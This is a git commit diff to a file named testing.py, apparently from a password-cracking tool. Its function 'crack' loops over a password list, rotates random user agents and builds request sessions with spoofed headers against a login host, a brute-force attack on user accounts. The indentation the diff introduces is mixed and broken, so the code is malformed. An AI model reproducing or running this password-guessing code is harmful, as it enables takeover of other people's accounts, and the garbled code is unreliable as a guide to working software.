24f07a4934e14e95a40b131e475d216e57c35590
SHANTO-KING <143583631+SHANTO-KING@users.noreply.github.com>
2023-10-13 08:32:54 +0600

    Add files via upload

--- testing.py
+++ testing.py
@@ -468,10 +468,10 @@ def crack(idf,pwv):
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
-		try:
-            for pw in __chi__:
+	 for pw in __chi__:
                 pw = pw.lower()
                 session=requests.Session()
+            try:
                 header = {
                     "Host":cebok,
                     "upgrade-insecure-requests":"1",
